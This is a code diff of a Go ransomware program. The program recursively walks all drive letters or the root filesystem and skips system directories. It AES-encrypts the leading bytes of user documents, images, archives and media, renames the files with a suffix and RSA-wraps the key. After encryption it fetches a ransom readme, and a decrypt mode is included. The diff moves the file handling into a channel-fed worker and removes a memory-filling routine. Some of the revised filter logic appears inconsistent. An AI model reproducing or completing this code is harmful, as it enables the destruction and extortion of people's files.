@@ -21,7 +21,6 @@ package main
 
 import (
 	"crypto/aes"
-	"crypto/cipher"
 	"crypto/rand"
 	"crypto/rsa"
 	"crypto/x509"
@@ -31,98 +30,34 @@ import (
 	"net/http"
 	"os"
 	"runtime"
-	"strings"
+	"crypto/cipher"
 )
 
-func encrypt(filename string, cip cipher.Block) error {
+const procNum = 10
 
-	if len(filename) >= 1+len(filesuffix) && filename[len(filename)-len(filesuffix):] == filesuffix {
+var method byte
+var handleList chan string
+
+func init() {
+	handleList = make(chan string, 2048)
+}
+
+func do_cAll(path string) error {
+
+	if filter(path) == 0 {
 		return nil
 	}
 
-	f, err := os.OpenFile(filename, os.O_RDWR, 0)
+	dir, err := os.Stat(path)
 	if err != nil {
 		return err
 	}
-	fstat, _ := f.Stat()
-	size := fstat.Size()
 
-	buf, out := make([]byte, 16), make([]byte, 16)
-	for offset := int64(0); size-offset > 16 && offset < (8*1024*1024); offset += 16 {
-		f.ReadAt(buf, offset)
-		cip.Encrypt(out, buf)
-		f.WriteAt(out, offset)
-	}
-
-	f.Close()
-	os.Rename(filename, filename+filesuffix)
-	return nil
-}
-
-func decrypt(filename string, cip cipher.Block) error {
-
-	if len(filename) < 1+len(filesuffix) || filename[len(filename)-len(filesuffix):] != filesuffix {
-		return nil
-	}
-	f, err := os.OpenFile(filename, os.O_RDWR, 0)
-	fmt.Println("Decrypting: ", filename)
-	if err != nil {
-		return err
-	}
-	fstat, _ := f.Stat()
-	size := fstat.Size()
-	buf, out := make([]byte, 16), make([]byte, 16)
-	for offset := int64(0); size-offset > 16 && offset < (8*1024*1024); offset += 16 {
-		f.ReadAt(buf, offset)
-		cip.Decrypt(out, buf)
-		f.WriteAt(out, offset)
-	}
-	f.Close()
-	os.Rename(filename, filename[0:len(filename)-len(filesuffix)])
-	return nil
-}
-
-func filter(path string, action byte) int8 {
-
-	lowPath := strings.ToLower(path)
-
-	innerList := []string{"windows", "program", "appdata", "system"}
-	suffixList := []string{".vmdk", ".txt", ".zip", ".rar", ".7z", ".doc", ".docx", ".ppt", ".pptx", ".xls", ".xlsx", ".jpg", ".gif", ".jpeg", ".png", ".mpg", ".mov", ".mp4", ".avi", ".mp3"}
-
-	for _, inner := range innerList {
-		if strings.Contains(lowPath, inner) {
-			return 0
+	if !dir.IsDir() && dir.Size() >= 1024 {
+		if dir.Size() >= 1024 || (method == 'e' && filter(path) == 2) {
+			return nil
 		}
-	}
-	for _, suffix := range suffixList {
-		if strings.HasSuffix(lowPath, suffix) {
-			return 1
-		}
-	}
-	return 2
-}
-
-func do_cAll(path string, cip cipher.Block, action byte) error {
-
-	if filter(path, action) == 0 {
-		return nil
-	}
-
-	dir, serr := os.Stat(path)
-	if serr != nil {
-		return serr
-	}
-
-	if !dir.IsDir() {
-		switch action {
-		case 'e':
-			if filter(path, action) != 1 {
-				return nil
-			}
-			encrypt(path, cip)
-		case 'd':
-			decrypt(path, cip)
-		}
+		handleList <- path
 	}
 
 	fd, err := os.Open(path)
@@ -130,39 +65,41 @@ func do_cAll(path string, cip cipher.Block, action byte) error {
 		return err
 	}
 
-	names, err1 := fd.Readdirnames(100)
+	names, err1 := fd.Readdirnames(1000)
 	if len(names) == 0 || err1 != nil {
 		return nil
 	}
 
 	for _, name := range names {
-		do_cAll(path+string(os.PathSeparator)+name, cip, action)
+		do_cAll(path + string(os.PathSeparator) + name)
 	}
 	return nil
 }
 
-func cAll(cip cipher.Block, action byte) {
+func cAll() {
 
 	defer func() {
-		if action == 'e' {
+		if method == 'e' {
 			downloadReadme()
 		}
 	}()
 
 	if runtime.GOOS != "windows" {
-		do_cAll("/", cip, action)
+		do_cAll("/")
 	}
 
 	DriverChan := make(chan bool, 26)
 	for i := 0; i < 26; i++ {
-		go func(path string, cip cipher.Block, action byte, ExitChan chan bool) {
-			do_cAll(path, cip, action)
+		go func(path string, ExitChan chan bool) {
+			do_cAll(path)
 			ExitChan <- true
-		}(string('A'+i)+":\\", cip, action, DriverChan)
+		}(string('A'+i)+":\\", DriverChan)
 	}
 	for i := 0; i < 26; i++ {
 		<-DriverChan
 	}
+
+	close(handleList)
 
 	return
 }
@@ -174,24 +111,6 @@ func saveKey(cip []byte) {
 	pub := pubI.(*rsa.PublicKey)
 	word, _ := rsa.EncryptPKCS1v15(rand.Reader, pub, cip)
 	keyFile.WriteAt(word, 0)
-	return
-}
-
-func eatMem() {
-	randBytes := make([]byte, 1280)
-	rand.Read(randBytes)
-	eatNum := 0
-	for i := 0; i < len(randBytes); i++ {
-		eatNum += int(randBytes[i])
-	}
-	c := make([]string, eatNum)
-	tmpc := make([]byte, 1024)
-	pf, _ := os.Create("programdata" + filesuffix)
-	for i := 0; i < eatNum-1; i++ {
-		rand.Read(tmpc)
-		c[i] = string(tmpc)
-		pf.Write(tmpc)
-	}
 	return
 }
 
@@ -216,18 +135,20 @@ func main() {
 		action = false
 	}
 	b := make([]byte, 32)
+	var cip cipher.Block
 	if !action {
 		rand.Read(b)
-		cip, _ := aes.NewCipher(b)
+		cip, _ = aes.NewCipher(b)
 		saveKey(b)
-		cAll(cip, 'e')
-		//		do_cAll("test", cip, 'e')
-		return
+		method = 'e'
+		go cAll()
+		//do_cAll("test");close(handleList)
 	} else {
-		cip, _ := aes.NewCipher(bb)
+		cip, _ = aes.NewCipher(bb)
 		fmt.Println("Your files are decrypting...")
-		cAll(cip, 'd')
-		//		do_cAll("test", cip, 'd')
-		return
+		method = 'd'
+		//do_cAll("test");close(handleList)
 	}
+	go cAll()
+	startHandler(cip)
 }
